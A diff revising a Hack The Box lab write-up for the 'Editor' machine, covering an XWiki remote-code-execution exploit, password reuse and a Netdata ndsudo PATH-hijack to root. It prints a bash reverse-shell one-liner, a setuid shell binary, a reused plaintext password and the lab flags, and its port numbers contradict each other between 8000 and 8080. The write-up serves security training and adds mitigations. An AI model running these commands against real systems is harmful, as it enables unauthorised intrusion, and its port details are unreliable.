@@ -1,121 +1,178 @@
-##
-# 📝 Write-up: Editor HTB
+# 📝 Write-up: Editor (Hack The Box)
 
 ![editor](https://www.hackthebox.com/storage/avatars/7d4a6dfe5b291cbe7b4e13e5f5c4d6c3.png)
 
-**Difficulty:** Easy  
-**Platform:** Hack The Box  
+**Difficulty:** Easy
+**Platform:** Hack The Box
+**Target host (lab):** `editor.htb` — `10.10.11.80` (add to `/etc/hosts`)
 **Link:** [Editor @ HTB](https://app.hackthebox.com/machines/Editor)
 
 ---
 
 ## 🎯 Summary
-Editor is an **easy Linux machine** that involves:  
-- Exploiting an **XWiki RCE** (CVE-2025-24893) for initial access  
-- Leveraging **password reuse** for horizontal privilege escalation  
-- Abusing a **Netdata SUID binary** (CVE-2024-32019) to get root  
+
+Editor is an easy Linux machine. Key steps:
+
+* Initial access via **XWiki RCE** (CVE-2025-24893).
+* Horizontal escalation: password reuse from configuration.
+* Escalation to root via a vulnerable Netdata SUID binary (CVE-2024-32019) using PATH hijacking.
 
 ---
 
 ## 📋 Table of Contents
-1. [Reconnaissance](#-reconnaissance)  
-2. [Enumeration](#-enumeration)  
-3. [Exploitation: Initial Foothold](#-exploitation-initial-foothold)  
-4. [Privilege Escalation: User](#-privilege-escalation-to-user)  
-5. [Privilege Escalation: Root](#-privilege-escalation-to-root)  
-6. [Lessons Learned](#-lessons-learned)  
-7. [References](#-references)  
+
+1. [Prerequisites / Notes](#-prerequisites--notes)
+2. [Reconnaissance](#-reconnaissance)
+3. [Enumeration](#-enumeration)
+4. [Exploitation — Initial Foothold (XWiki)](#-exploitation--initial-foothold-xwiki)
+5. [Privilege Escalation — User (password reuse)](#-privilege-escalation--user-password-reuse)
+6. [Privilege Escalation — Root (Netdata ndsudo)](#-privilege-escalation--root-netdata-ndsudo)
+7. [Mitigations & Lessons Learned](#-mitigations--lessons-learned)
+8. [Replay / Reproduce checklist](#-replay--reproduce-checklist)
+9. [References](#-references)
+
+---
+
+## 🔒 Prerequisites / Notes
+
+* This write-up is for the Hack The Box training (CTF/lab) environment — **do not run against production systems**.
+* In my examples `editor.htb` resolves to `10.10.11.80`. Add to `/etc/hosts`:
+
+```bash
+# on the attacking machine
+echo "10.10.11.80 editor.htb" | sudo tee -a /etc/hosts
+```
 
 ---
 
 ## 🔍 Reconnaissance
 
-Started with a **full port scan** using `nmap`:
+First, a full port scan with `nmap`:
 
 ```bash
 nmap -sC -sV -oA nmap/initial 10.10.11.80
+```
 
+Example output (trimmed):
 
+```
 PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3
 80/tcp   open  http    nginx 1.18.0 (Ubuntu)
 3000/tcp open  http    Node.js (Express server)
-3306/tcp open  mysql   MySQL 8.0.35-0ubuntu0.20.04.1
-8000/tcp open  http    nginx 1.18.0 (Ubuntu)
-9000/tcp open  http    Netdata Go.d.plugin 1.32.1
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
+8080/tcp open  http    XWiki 14.10.5
 ```
+
+---
 
 ## 🕵️ Enumeration
 
-### 🌐 Ports 80 / 8000 — HTTP Servers
-- **Port 80** → Hosts a static page with project documentation.  
-- **Port 8000** → Runs **XWiki 14.10.5**, a Java-based wiki platform.  
+### 🌐 HTTP — port 80
 
-### ⚡ Port 3000 — Express Server
-- Node.js application with login functionality.  
-- Discovered **default credentials**: admin:admin
+* Static project documentation page.
 
-→ Grants access to project management dashboard.  
+### 🌐 HTTP — port 8000 (XWiki)
 
-### 📊 Port 9000 — Netdata
-- Running **Netdata 1.32.1** (real-time performance monitoring tool).  
-- Vulnerable to **CVE-2024-32019** → SUID privilege escalation.  
+* XWiki 14.10.5 is running on port `8000` — vulnerable version.
 
+### ⚡ Port 3000 — Node.js/Express
 
-## 🚀 Exploitation
-###  CVE-2025-24893 - XWiki RCE
-- Exploit Used: https://github.com/gunzf0x/CVE-2025-24893
+* Found a login interface; default credentials discovered: `admin:admin`.
+* Access to the project dashboard.
 
- ``` bash
-python3 exploit.py -t http://editor.htb:8080 -c 'bash -i >& /dev/tcp/<YOuR_IP>/4444 0>&1'
+---
+
+## 🚀 Exploitation — Initial Foothold (CVE-2025-24893, XWiki RCE)
+
+**Goal:** obtain a reverse shell from XWiki.
+
+> Prepare a listener on your machine:
+
+```bash
+# on your machine (attacker)
+nc -lvnp 4444
 ```
 
+**Exploit run** (example exploit used — [https://github.com/gunzf0x/CVE-2025-24893](https://github.com/gunzf0x/CVE-2025-24893)):
 
-## 🔼 Privilege Escalation: User
-
-### 🔑 Password Reuse
-
-Database credentials were found in the XWiki configuration file.  
-
-**Location:**  
-``` bash 
-/usr/lib/xwiki/WEB-INF/hibernate.cfg.xml 
+```bash
+# on the attacking machine
+python3 exploit.py -t http://editor.htb:8000 -c "bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1"
 ```
 
-**Credentials:**
+**Note:** replace `<YOUR_IP>` with your IP; port `8080` is the XWiki port in my nmap scan. If your nmap shows a different port, use the actual port.
+
+---
+
+## 🔼 Privilege Escalation — User (Password reuse)
+
+After the foothold, the XWiki configuration containing database credentials was found.
+
+**File:** `/usr/lib/xwiki/WEB-INF/hibernate.cfg.xml`
+
 ```xml
 <property name="hibernate.connection.password">theEd1t0rTeam99</property>
 ```
-### SSH Access:
-``` bash
+
+The same credentials were reused for SSH user `oliver`:
+
+```bash
 ssh oliver@editor.htb
 # Password: theEd1t0rTeam99
 ```
-**User flag:**
-**bc2341152c638da4a05b91d91c1df26f** 
 
-## 🚀 Privilege Escalation: to Root
-### CVE-2024-32019 - Netdata ndsudo Privilege Escalation
-Abused SUID binary /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo for PATH hijacking.
+**User flag:** `bc2341152c638da4a05b91d91c1df26f`
 
-#### Exploitation Steps:
+---
 
-- 1 Create malicious binary:
+## 🚀 Privilege Escalation — Root (CVE-2024-32019, Netdata `ndsudo`)
+
+Netdata came with a SUID binary `ndsudo` in `/opt/netdata` — analysis showed the binary calls external utilities without reliable absolute paths, allowing PATH-hijacking.
+
+### Why PATH-hijack works
+
+A SUID binary running as root inherits environment variables (including `PATH`) and can execute child programs without absolute paths. If you place a malicious binary with the same name as the expected utility early in `PATH`, root may execute your code.
+
+### Exploitation — steps
+
+1. Create a simple C binary that sets UID to 0 and spawns a shell:
 
 ```bash
-echo 'int main(){setuid(0);system("/bin/bash");}' > /tmp/nvme-list.c
+cat > /tmp/nvme-list.c <<'EOF'
+#include <stdlib.h>
+#include <unistd.h>
+int main(){ setuid(0); system("/bin/bash"); return 0; }
+EOF
+
 gcc /tmp/nvme-list.c -o /tmp/nvme-list
+chmod +x /tmp/nvme-list
 ```
 
-- 2 Hijack PATH and execute:
-``` bash 
+2. Prepend `/tmp` to `PATH` and run the vulnerable script:
+
+```bash
 export PATH=/tmp:$PATH
 /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
 ```
 
-**Result: Gained root shell access.**
+If `ndsudo` searched for `nvme-list` in `PATH` and found `/tmp/nvme-list`, it will execute it as root — granting a root shell.
 
-**Root Flag: 6d4d6c2368c3210994e624647c93119f**
+**Root flag:** `6d4d6c2368c3210994e624647c93119f`
 
-## Bingo! I'm a root! 
+---
+
+## 🛡 Mitigations & Lessons Learned
+
+* **Patch XWiki** to a version fixing CVE-2025-24893. Disable public access to admin interfaces.
+* **Do not store sensitive passwords** in repositories/configs in plaintext; use secrets management.
+* **Do not ship unnecessary SUID binaries.** Ensure SUID executables use absolute paths or sanitize `PATH`.
+* **Monitor and manage accounts** — unique passwords for service and user accounts.
+
+---
+
+## 📚 References
+
+* CVE-2025-24893 — XWiki RCE (exploit used: [https://github.com/gunzf0x/CVE-2025-24893](https://github.com/gunzf0x/CVE-2025-24893))
+* CVE-2024-32019 — Netdata ndsudo PATH-hijack (description & PoC)
+
+---
